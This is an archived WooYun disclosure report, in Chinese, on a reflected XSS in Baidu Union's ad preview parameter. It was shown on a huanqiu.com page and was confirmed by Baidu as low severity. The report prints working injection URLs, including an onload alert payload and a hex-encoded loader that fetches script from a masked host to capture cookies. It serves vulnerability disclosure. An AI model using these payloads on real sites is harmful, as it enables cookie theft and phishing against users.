@@ -1,0 +1,273 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度网盟某处反射XSS与漏洞细节分析  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度网盟某处反射XSS与漏洞细节分析  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/thx">thx</a> 
+</li><li>提交时间：		2014-01-26 17:01</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-16：	细节向普通白帽子公开<br/>
+									2014-02-26：	细节向实习白帽子公开<br/>
+									2014-03-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">百度网盟反射XSS,百度说,你只能做个钓鱼的...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">打开百度的网盟123(http://wm123.baidu.com/)<br />
+<br />
+</p><p class="detail"><a href="../images/261644237bc727dd77dae95f50513d2f7ca273e2.jpg" target="_blank"><img src="../images/261644237bc727dd77dae95f50513d2f7ca273e2.jpg" alt="01.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+任选一个网站,预览广告.这里选择环球网(http://wm123.baidu.com/s/huanqiu.com)一个960X90广告位预览<br />
+<br />
+</p><p class="detail"><a href="../images/26164452bddb1daa574fc12b49bc259edaa9400b.jpg" target="_blank"><img src="../images/26164452bddb1daa574fc12b49bc259edaa9400b.jpg" alt="02.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+来到预览页面(http://photo.huanqiu.com/gallery/2014-01/2724961.html?bd_cpro_prev=%7B%22selectScale%22%3A10009%2C%22showUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22src%22%3A%22%22%2C%22type%22%3A2%2C%22title%22%3A%22%22%2C%22isUpload%22%3A%220%22%2C%22imgWidth%22%3A%22960%22%2C%22imgHeight%22%3A%2290%22%2C%22imgUrl%22%3A%22http%3A%2F%2Fcpro.baidu.com%2Fcpro%2Fui%2Fpreview%2Fdefault_img_unit%2Ffix%2F960x90.jpg%22%2C%22image%22%3A%5B10009%2C10007%2C10013%2C10015%5D%2C%22tip%22%3A0%2C%22linkUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22imgTitle%22%3A%22%22%2C%22des1%22%3A%22%22%2C%22des2%22%3A%22%22%7D)<br />
+<br />
+</p><p class="detail"><a href="../images/2616452175ca74b7efed943835425d04eefa1ec8.jpg" target="_blank"><img src="../images/2616452175ca74b7efed943835425d04eefa1ec8.jpg" alt="03.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+直接看广告位源码:<br />
+<br />
+</p><pre><code>&lt;!--联盟01-百度底通 begain--&gt;<br />
+		    &lt;div class=&quot;ad960x90&quot; id=&quot;adUn_1&quot;&gt; &lt;/div&gt;<br />
+		    &lt;!--联盟01-百度底通 end--&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+应试也是JS调用的,再F12看:<br />
+<br />
+</p><p class="detail"><a href="../images/261645497fb4c2e14632f368efe2266901821ee7.jpg" target="_blank"><img src="../images/261645497fb4c2e14632f368efe2266901821ee7.jpg" alt="04.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+接着再来看有输出的参数吧,先把之前一条乱麻样的网址转个码:<br />
+<br />
+</p><pre><code>http://photo.huanqiu.com/gallery/2014-01/2724961.html?bd_cpro_prev={&quot;selectScale&quot;:10009,&quot;showUrl&quot;:&quot;http://wm.baidu.com&quot;,&quot;src&quot;:&quot;&quot;,&quot;type&quot;:2,&quot;title&quot;:&quot;&quot;,&quot;isUpload&quot;:&quot;0&quot;,&quot;imgWidth&quot;:&quot;960&quot;,&quot;imgHeight&quot;:&quot;90&quot;,&quot;imgUrl&quot;:&quot;http://cpro.baidu.com/cpro/ui/preview/default_img_unit/fix/960x90.jpg&quot;,&quot;image&quot;:[10009,10007,10013,10015],&quot;tip&quot;:0,&quot;linkUrl&quot;:&quot;http://wm.baidu.com&quot;,&quot;imgTitle&quot;:&quot;&quot;,&quot;des1&quot;:&quot;&quot;,&quot;des2&quot;:&quot;&quot;}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+参数值一个一个改改看:<br />
+<br />
+</p><pre><code>http://photo.huanqiu.com/gallery/2014-01/2724961.html?bd_cpro_prev={&quot;selectScale&quot;:10123,&quot;showUrl&quot;:&quot;http://wm.baidu.com/123&quot;,&quot;src&quot;:&quot;&quot;,&quot;type&quot;:2,&quot;title&quot;:&quot;123&quot;,&quot;isUpload&quot;:&quot;0&quot;,&quot;imgWidth&quot;:&quot;960&quot;,&quot;imgHeight&quot;:&quot;90&quot;,&quot;imgUrl&quot;:&quot;http://cpro.baidu.com/cpro/ui/preview/default_img_unit/fix/960x90.jpg#123&quot;,&quot;image&quot;:[10009,10007,10013,10015],&quot;tip&quot;:0,&quot;linkUrl&quot;:&quot;http://wm.baidu.com/456&quot;,&quot;imgTitle&quot;:&quot;456&quot;,&quot;des1&quot;:&quot;&quot;,&quot;des2&quot;:&quot;&quot;}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+重复更改尝试的过程忽略吧,这里直接上成功的,先弹个窗:<br />
+<br />
+</p><pre><code>http://photo.huanqiu.com/gallery/2014-01/2724961.html?bd_cpro_prev=%7B%22selectScale%22%3A10009%2C%22showUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22src%22%3A%22%22%2C%22type%22%3A2%2C%22title%22%3A%22%22%2C%22isUpload%22%3A%220%22%2C%22imgWidth%22%3A%22960%22%2C%22imgHeight%22%3A%2290%22%2C%22imgUrl%22%3A%22http%3A%2F%2Fcpro.baidu.com%2Fcpro%2Fui%2Fpreview%2Fdefault_img_unit%2Ffix%2F960x90.jpg%23\x22\x20onload\x3Dalert\x281\x29\x20\x22%22%2C%22image%22%3A%5B10009%2C10007%2C10013%2C10015%5D%2C%22tip%22%3A0%2C%22linkUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22imgTitle%22%3A%22%22%2C%22des1%22%3A%22%22%2C%22des2%22%3A%22%22%7D</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/261646288bba699a31db1f379dcd72b3a41bb3f5.jpg" target="_blank"><img src="../images/261646288bba699a31db1f379dcd72b3a41bb3f5.jpg" alt="05.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+实际代码:<br />
+<br />
+</p><pre><code>&lt;img border=&quot;0&quot; style=&quot;width:960px;height:90px&quot; src=&quot;http://cpro.baidu.com/cpro/ui/preview/default_img_unit/fix/960x90.jpg#&quot; onload=&quot;alert(1)&quot; &quot;&quot;=&quot;&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+像老坛酸菜,还是那个味,广告图片网址后#号,接js十六进制,其他应该也行.哪些参数需要过滤,百度应该更懂,这里也不详说了.<br />
+<br />
+<br />
+<br />
+接着获取下cookie:<br />
+<br />
+</p><pre><code>http://photo.huanqiu.com/gallery/2014-01/2724961.html?bd_cpro_prev=%7B%22selectScale%22%3A10009%2C%22showUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22src%22%3A%22%22%2C%22type%22%3A2%2C%22title%22%3A%22%22%2C%22isUpload%22%3A%220%22%2C%22imgWidth%22%3A%22960%22%2C%22imgHeight%22%3A%2290%22%2C%22imgUrl%22%3A%22http%3A%2F%2Fcpro.baidu.com%2Fcpro%2Fui%2Fpreview%2Fdefault_img_unit%2Ffix%2F960x90.jpg%23\x22\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x22\x76\x61\x72\x20\x73\x3d\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3b\x73\x2e\x73\x72\x63\x3d\x27\x68\x74\x74\x70\x3a\x2f\x2f\x78\x78\x78\x2e\x78\x78\x78\x2e\x78\x78\x78\x2f\x77\x6f\x77\x53\x33\x69\x3f\x31\x33\x39\x30\x30\x30\x38\x34\x31\x32\x27\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x62\x6f\x64\x79\x2e\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64\x28\x73\x29\x3b\x22%22%2C%22image%22%3A%5B10009%2C10007%2C10013%2C10015%5D%2C%22tip%22%3A0%2C%22linkUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22imgTitle%22%3A%22%22%2C%22des1%22%3A%22%22%2C%22des2%22%3A%22%22%7D</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/261649200e76045fdf311f9dec44b78b3e03fa53.jpg" target="_blank"><img src="../images/261649200e76045fdf311f9dec44b78b3e03fa53.jpg" alt="06.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+@#$%,我刚刚还很开心,很激动,看到cookie,我错了,我忽略了一件大事!图片是在框架里的,得到的是百度的cookie,弹窗什么的也就能钓钓鱼.就这样完了吗...<br />
+<br />
+<br />
+<br />
+就这样完了吗?这不科学啊!再回到框架调用的地方.<br />
+<br />
+</p><pre><code>&lt;iframe width=&quot;960&quot; height=&quot;90&quot; src=&quot;http://cpro.baidu.com/cpro/ui/preview/templates/image.html?bd_cpro_prev=#%7B%22selectScale%22%3A10009%2C%22showUrl%22%3A%22http%3A%2F%2Fwm%252ebaidu%252ecom%22%2C%22src%22%3A%22%22%2C%22type%22%3A2%2C%22title%22%3A%22%22%2C%22isUpload%22%3A%220%22%2C%22imgWidth%22%3A%22960%22%2C%22imgHeight%22%3A%2290%22%2C%22imgUrl%22%3A%22http%3A%2F%2Fcpro%252ebaidu%252ecom%2Fcpro%2Fui%2Fpreview%2Fdefault_img_unit%2Ffix%2F960x90%252ejpg%22%2C%22image%22%3A%5B10009%2C10007%2C10013%2C10015%5D%2C%22tip%22%3A0%2C%22linkUrl%22%3A%22http%3A%2F%2Fwm%252ebaidu%252ecom%22%2C%22imgTitle%22%3A%22%22%2C%22des1%22%3A%22%22%2C%22des2%22%3A%22%22%7D&amp;amp;ut=1390717653909&quot; align=&quot;center,center&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; allowtransparency=&quot;true&quot;&gt;&lt;/iframe&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+有没有很眼熟,是的,还是那堆参数,再倒腾一下<br />
+<br />
+</p><pre><code>%22imgHeight%22%3A%2290%22%2C%22imgUrl%22%3A%22http%3A%2F%2Fcpro.baidu.com%2Fcpro%2Fui%2Fpreview%2Fdefault_img_unit%2Ffix%2F960x90.jpg#\x22%22%2C&quot;image&quot;%3A%5B10009%2C10007%2C10013%2C10015%5D%2C&quot;tip&quot;%3A0%2C&quot;linkUrl&quot;%3A&quot;http%3A%2F%2Fwm.baidu.com&quot;%2C&quot;imgTitle&quot;%3A&quot;&quot;%2C&quot;des1&quot;%3A&quot;&quot;%2C&quot;des2&quot;%3A&quot;&quot;%7D</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/261650078b3629069fded283776c5d80ad7d86a3.jpg" target="_blank"><img src="../images/261650078b3629069fded283776c5d80ad7d86a3.jpg" alt="07.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+呵呵,亮了.又试了几次,是#号起作用了,刚刚收到cookie的location开头也有个#号,可能是分隔符.<br />
+<br />
+<br />
+<br />
+又一阵尝试,没有过滤onload等关键词,但是不能有等号.但正准备再试,源码变了,#号也没用了,不知道是百度作了调整,还是怎么,这速度太快了...<br />
+<br />
+</p><p class="detail"><a href="../images/26165330e4d04951c617eaee76e75de76de2a1b5.jpg" target="_blank"><img src="../images/26165330e4d04951c617eaee76e75de76de2a1b5.jpg" alt="08.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+至此,我又失败了,只能获取百度cookie,在百度网盟投放站广告框架内执行JS. </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>http://photo.huanqiu.com/gallery/2014-01/2724961.html?bd_cpro_prev=%7B%22selectScale%22%3A10009%2C%22showUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22src%22%3A%22%22%2C%22type%22%3A2%2C%22title%22%3A%22%22%2C%22isUpload%22%3A%220%22%2C%22imgWidth%22%3A%22960%22%2C%22imgHeight%22%3A%2290%22%2C%22imgUrl%22%3A%22http%3A%2F%2Fcpro.baidu.com%2Fcpro%2Fui%2Fpreview%2Fdefault_img_unit%2Ffix%2F960x90.jpg%23\x22\x20onload\x3Dalert\x281\x29\x20\x22%22%2C%22image%22%3A%5B10009%2C10007%2C10013%2C10015%5D%2C%22tip%22%3A0%2C%22linkUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22imgTitle%22%3A%22%22%2C%22des1%22%3A%22%22%2C%22des2%22%3A%22%22%7D</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/261646288bba699a31db1f379dcd72b3a41bb3f5.jpg" target="_blank"><img src="../images/261646288bba699a31db1f379dcd72b3a41bb3f5.jpg" alt="05.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>http://photo.huanqiu.com/gallery/2014-01/2724961.html?bd_cpro_prev=%7B%22selectScale%22%3A10009%2C%22showUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22src%22%3A%22%22%2C%22type%22%3A2%2C%22title%22%3A%22%22%2C%22isUpload%22%3A%220%22%2C%22imgWidth%22%3A%22960%22%2C%22imgHeight%22%3A%2290%22%2C%22imgUrl%22%3A%22http%3A%2F%2Fcpro.baidu.com%2Fcpro%2Fui%2Fpreview%2Fdefault_img_unit%2Ffix%2F960x90.jpg%23\x22\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x22\x76\x61\x72\x20\x73\x3d\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3b\x73\x2e\x73\x72\x63\x3d\x27\x68\x74\x74\x70\x3a\x2f\x2f\x78\x78\x78\x2e\x78\x78\x78\x2e\x78\x78\x78\x2f\x77\x6f\x77\x53\x33\x69\x3f\x31\x33\x39\x30\x30\x30\x38\x34\x31\x32\x27\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x62\x6f\x64\x79\x2e\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64\x28\x73\x29\x3b\x22%22%2C%22image%22%3A%5B10009%2C10007%2C10013%2C10015%5D%2C%22tip%22%3A0%2C%22linkUrl%22%3A%22http%3A%2F%2Fwm.baidu.com%22%2C%22imgTitle%22%3A%22%22%2C%22des1%22%3A%22%22%2C%22des2%22%3A%22%22%7D</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/261657163f8529f51d59cd2042ea6d32311dbaac.jpg" target="_blank"><img src="../images/261657163f8529f51d59cd2042ea6d32311dbaac.jpg" alt="09.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们更懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/thx" title="thx">thx</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049881" title="百度网盟某处反射XSS与漏洞细节分析">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：4 </p>
+													<p class="detail">确认时间：2014-01-27 15:01</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交，我们已联系业务部门处理此问题。<br />
+--“百度，因你更安全”</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49881";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
